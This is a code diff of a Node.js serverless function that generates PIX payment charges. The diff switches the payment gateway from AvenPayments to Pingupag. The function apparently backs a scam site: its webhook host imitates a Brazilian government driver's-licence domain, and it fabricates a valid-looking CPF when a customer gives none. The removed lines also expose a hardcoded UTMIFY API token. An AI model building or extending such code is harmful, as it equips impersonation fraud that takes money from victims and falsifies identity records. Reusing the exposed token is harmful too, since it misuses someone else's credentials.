@@ -1,8 +1,9 @@
 const { getSupabase } = require("./lib/supabase");
+const credentials = require("./credentials");
 
-const AVEN_BASE = "https://api.avenpayments.com";
-const AVEN_API_KEY = process.env.AVEN_API_KEY;
-const UTMIFY_TOKEN = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";
+const PINGUPAG_BASE = "https://app.pingupag.com/gateway/v1";
+const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || credentials.PINGUPAG_API_KEY;
+const UTMIFY_TOKEN = process.env.UTMIFY_TOKEN || credentials.UTMIFY_TOKEN;
 const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
 const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 
@@ -11,10 +12,10 @@ const utmifyCache = new Map();
 const CACHE_TTL = 60000;
 
 function getAuthHeader() {
-  if (!AVEN_API_KEY) {
-    throw new Error("❌ AVEN_API_KEY não configurada!");
+  if (!PINGUPAG_API_KEY) {
+    throw new Error("❌ PINGUPAG_API_KEY não configurada!");
   }
-  return `Bearer ${AVEN_API_KEY}`;
+  return PINGUPAG_API_KEY;
 }
 
 async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
@@ -31,7 +32,7 @@ async function sendUtmify(transactionId, status, customer, amountCents, createdA
     const netCents = amountCents - gatewayFeeCents;
     const payload = {
       orderId: transactionId,
-      platform: "AvenPayments",
+      platform: "Pingupag",
       paymentMethod: "pix",
       status,
       createdAt: createdAt || new Date().toISOString().replace("T"," ").slice(0,19),
@@ -70,7 +71,7 @@ async function sendUtmify(transactionId, status, customer, amountCents, createdA
 
     await fetch("https://api.utmify.com.br/api-credentials/orders", {
       method: "POST",
-      headers: { "Content-Type": "application/json", "x-api-token": UTMIFY_TOKEN },
+      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${UTMIFY_TOKEN}` },
       body: JSON.stringify(payload),
       signal: controller.signal,
     });
@@ -127,17 +128,17 @@ function fmtPhone(phone) {
 }
 
 exports.handler = async (event) => {
-  console.log("[PIX-AVEN] ===== FUNÇÃO INICIADA =====");
-  console.log("[PIX-AVEN] AVEN_API_KEY exists:", !!AVEN_API_KEY);
-  console.log("[PIX-AVEN] SUPABASE_URL exists:", !!SUPABASE_URL);
-  console.log("[PIX-AVEN] SUPABASE_KEY exists:", !!SUPABASE_KEY);
+  console.log("[PIX-PINGUPAG] ===== FUNÇÃO INICIADA =====");
+  console.log("[PIX-PINGUPAG] PINGUPAG_API_KEY exists:", !!PINGUPAG_API_KEY);
+  console.log("[PIX-PINGUPAG] SUPABASE_URL exists:", !!SUPABASE_URL);
+  console.log("[PIX-PINGUPAG] SUPABASE_KEY exists:", !!SUPABASE_KEY);
   
-  if (!AVEN_API_KEY) {
-    console.error("❌ ERRO: AVEN_API_KEY não configurada na Netlify!");
+  if (!PINGUPAG_API_KEY) {
+    console.error("❌ ERRO: PINGUPAG_API_KEY não configurada na Netlify!");
     return jsonResponse(500, {
       success: false,
       error: "Credenciais da gateway não configuradas",
-      debug: "AVEN_API_KEY não encontrada"
+      debug: "PINGUPAG_API_KEY não encontrada"
     });
   }
 
@@ -169,38 +170,38 @@ exports.handler = async (event) => {
   const cpfRaw = (body.cpf || body.document || body.customer_cpf || "").toString().replace(/\D/g, "");
   const customerCpf = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();
   const utms = body.utm || {};
-  const externalRef = `order_${randId}`;
+  const reference = `order_${randId}`;
 
-  console.log("[PIX-AVEN] Amount:", amountReais, "Cents:", amountCents);
-  console.log("[PIX-AVEN] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });
+  console.log("[PIX-PINGUPAG] Amount:", amountReais, "Cents:", amountCents);
+  console.log("[PIX-PINGUPAG] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });
 
-  // Payload para AvenPayments - SIMPLIFICADO SEM DELIVERY
+  // Payload para Pingupag
   const payload = {
     amount: amountCents,
-    currency: "BRL",
-    method: "PIX",
     description: "SHOPIFY LOJA 03",
-    externalRef: externalRef,
-    notificationUrl: "https://cnh-brasil-gov-br.netlify.app/webhook/payment",
-    payer: {
+    reference,
+    source: "api_externa",
+    customer: {
       name: customerName,
-      taxId: customerCpf,
       email: customerEmail,
-      phone: `55${customerPhone}`,
+      phone: customerPhone,
+      document: customerCpf,
     },
-    items: [{
-      quantity: 1,
-      name: "SHOPIFY LOJA 03",
-      price: amountCents,
-      type: "DIGITAL",
-    }],
+    postback_url: "https://cnh-brasil-gov-br.netlify.app/webhook/pingupag",
+    tracking: {
+      utm_source: utms.utm_source || null,
+      utm_campaign: utms.utm_campaign || null,
+      utm_medium: utms.utm_medium || null,
+      utm_content: utms.utm_content || null,
+      utm_term: utms.utm_term || null,
+    },
   };
 
-  let authHeader;
+  let apiKey;
   try {
-    authHeader = getAuthHeader();
+    apiKey = getAuthHeader();
   } catch (err) {
-    console.error("❌ [PIX-AVEN] Auth error:", err.message);
+    console.error("❌ [PIX-PINGUPAG] Auth error:", err.message);
     return jsonResponse(500, {
       success: false,
       error: "Credenciais não configuradas",
@@ -212,11 +213,11 @@ exports.handler = async (event) => {
     const controller = new AbortController();
     const timeout = setTimeout(() => controller.abort(), 30000);
     
-    const resp = await fetch(`${AVEN_BASE}/v1/payment`, {
+    const resp = await fetch(`${PINGUPAG_BASE}/transaction`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "Authorization": authHeader,
+        "X-API-Key": apiKey,
       },
       body: JSON.stringify(payload),
       signal: controller.signal,
@@ -227,7 +228,7 @@ exports.handler = async (event) => {
     if (!resp.ok) {
       let errMsg = text;
       try { errMsg = JSON.parse(text)?.message || errMsg; } catch {}
-      console.error("[AvenPayments] Erro HTTP:", resp.status, errMsg);
+      console.error("[Pingupag] Erro HTTP:", resp.status, errMsg);
       return jsonResponse(resp.status, {
         success: false,
         error: errMsg,
@@ -237,7 +238,7 @@ exports.handler = async (event) => {
 
     let parsed = {};
     try { parsed = JSON.parse(text); } catch {
-      console.error("[AvenPayments] Parse error:", text.substring(0, 200));
+      console.error("[Pingupag] Parse error:", text.substring(0, 200));
       return jsonResponse(500, {
         success: false,
         error: "Resposta inválida da gateway",
@@ -245,11 +246,11 @@ exports.handler = async (event) => {
       });
     }
 
-    const transactionId = parsed.id || parsed.externalRef || null;
-    const pixCode = parsed.data?.copypaste || null;
+    const transactionId = parsed.transaction_id || parsed.id || null;
+    const pixCode = parsed.qr_code || null;
 
     if (!transactionId || !pixCode) {
-      console.error("[AvenPayments] Resposta incompleta:", { transactionId, pixCode });
+      console.error("[Pingupag] Resposta incompleta:", { transactionId, pixCode });
       return jsonResponse(500, {
         success: false,
         error: "Gateway retornou resposta incompleta",
@@ -257,9 +258,9 @@ exports.handler = async (event) => {
       });
     }
 
-    console.log("[PIX-AVEN] ===== PIX GERADO COM SUCESSO =====");
-    console.log("[PIX-AVEN] Transaction ID:", transactionId);
-    console.log("[PIX-AVEN] PIX Code: ✓ Existe");
+    console.log("[PIX-PINGUPAG] ===== PIX GERADO COM SUCESSO =====");
+    console.log("[PIX-PINGUPAG] Transaction ID:", transactionId);
+    console.log("[PIX-PINGUPAG] PIX Code: ✓ Existe");
 
     // Salvar no Supabase (não bloqueia)
     if (SUPABASE_URL && SUPABASE_KEY) {
@@ -274,6 +275,7 @@ exports.handler = async (event) => {
           customer_phone: customerPhone,
           status: "pending",
           brcode: pixCode,
+          gateway: "pingupag",
           utm_source: utms.utm_source || null,
           utm_campaign: utms.utm_campaign || null,
           utm_medium: utms.utm_medium || null,
@@ -299,15 +301,17 @@ exports.handler = async (event) => {
       pix_code: pixCode,
       brcode: pixCode,
       payload: pixCode,
+      qr_code: pixCode,
       qr_code_image: null,
       transaction_id: transactionId,
       transactionId,
       deposit_id: transactionId,
       status: "pending",
+      amount: amountReais,
     });
 
   } catch (err) {
-    console.error("[PIX-AVEN] Erro ao chamar gateway:", err.message);
+    console.error("[PIX-PINGUPAG] Erro ao chamar gateway:", err.message);
     return jsonResponse(502, {
       success: false,
       error: "Falha ao conectar com gateway: " + String(err)
